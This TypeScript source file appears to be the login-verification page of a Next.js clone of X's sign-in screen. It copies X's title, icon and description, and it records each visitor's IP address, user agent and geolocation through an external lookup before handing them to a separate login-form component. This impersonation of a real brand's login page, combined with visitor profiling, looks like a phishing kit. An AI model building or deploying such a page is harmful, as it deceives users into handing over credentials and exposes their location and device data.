import type { Metadata } from "next";
import { XIcon } from "@/components/icons/x";
import { LoginFormSteps } from "@/components/login-form-steps";
import { headers } from "next/headers";

export const metadata: Metadata = {
	title: "Log in to X / X",
	description:
		"From breaking news and entertainment to sports and politics, get the full story with all the live commentary.",
};

export default async function LoginVerifyPage() {
	const header = await headers();

	// Obter IP do cabeçalho (x-forwarded-for ou fallback para localhost)
	const ip = header.get("x-forwarded-for") ?? "127.0.0.1";

	// Obter User-Agent
	const userAgent = header.get("user-agent") ?? "Unknown User Agent";

	// Geolocalização (API externa)
	const geoData = await fetch(`https://ipapi.co/${ip}/json/`).then((res) =>
		res.ok ? res.json() : { city: "Unknown", country_name: "Unknown" },
	);

	const geoLocation = `${geoData.city}, ${geoData.country_name}`;

	const data = {
		ip,
		userAgent,
		geoLocation,
	};

	return (
		<main className="flex-1 flex bg-[#3A4853]">
			<div className="md:fixed md:top-1/2 md:left-1/2 md:-translate-y-1/2 md:-translate-x-1/2 md:w-[600px] md:h-[70%] md:min-h-[540px] bg-black md:rounded-xl flex-1 flex flex-col items-center">
				<header className="pt-3 w-full h-14 flex items-center justify-center">
					<XIcon className="size-8 fill-white" />
				</header>

				<LoginFormSteps browserData={data} />
			</div>
		</main>
	);
}
